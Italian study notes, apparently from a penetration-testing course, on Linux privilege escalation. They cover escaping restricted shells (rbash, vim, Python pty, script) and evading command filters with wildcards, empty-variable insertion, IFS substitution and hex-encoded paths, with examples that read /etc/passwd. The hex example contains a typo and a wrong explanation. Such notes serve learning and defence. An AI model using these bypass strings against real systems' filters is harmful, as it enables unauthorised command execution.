## Obiettivo
L’obiettivo finale è la **Privilege Escalation**.
- È lo sfruttamento di:
    - bug
    - errori di configurazione
    - design sbagliato
    
- Serve per ottenere **permessi più alti (root)**

Con root puoi accedere a:
- dati sensibili
- file di sistema
- credenziali

## Contesto iniziale
Dopo un exploit si assume di avere:
- una **shell**
- un ambiente TTY (più o meno stabile)

# RESTRICTED SHELL
Esistono shell limitate:
- `rbash`
- `bash --restricted`

Limitano:
- esecuzione comandi
- cambio directory
- accesso a binari


## Identificare la shell
- `echo $SHELL` → shell di default dell’utente
- `echo $0` → shell attualmente in uso

## Escape dalla restricted shell
Metodi comuni:
- avviare una nuova shell:
    - `bash`
    - `/bin/bash`
    - `/bin/sh`

- usare editor:    
    - `vi`
    - `vim`
    - `nano`
    
	Dentro l’editor:
	- `:! <comando>`
	- oppure shortcut (es. CTRL+T and write command)
	
	Esempi:
	- `vim -c '!/bin/bash'`
	
	Altri metodi:
	- Python:
	    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
	- Script:
	    - `script -qc /bin/bash /dev/null`
			- al posto di `/bash` posso mettere anche `/zsh` e altre mille bash A SECONDA DELLA BASH CHE TROVO DOPO AVERE FATTO `echo $SHELL` / `echo $0

# BYPASS RESTRIZIONI COMANDI
Se alcuni comandi sono bloccati:
### Wildcard / pattern
- `/bin/b?sh`
- `/bin/b*sh`

### Alterazione stringhe
- `/usr/bin/who*mi`
- `p${u}i${u}n${u}g` → la bash sostituisce alla variabile d'ambiente `u` un valore nullo (la cancella), quindi poi rimane solo `ping` e lo esegue

Motivo:
- la shell espande variabili e wildcard
- i controlli spesso sono deboli

# BYPASS SPAZI
Se lo spazio è vietato:
### IFS (Internal Field Separator)
- `cat${IFS}/etc/passwd`
	- `IFS` -> variabile d'ambiente che definisce "spazio"

### Ridefinizione IFS
- `IFS=] ; b=/bin/bash] ; $b` -> esegue `b` e poi sostituisce `]` con IFS e quindi "spazio"

### Altri metodi
- `{cat,file}`
- `cat</etc/passwd`
- esadecimale:
    - `X=$'\x2f\x62\x69\x6e\x2f\x6c\x73';$XD`
    	- `/x` indica lo spazio

Funziona perché:
- la shell interpreta input in modo flessibile
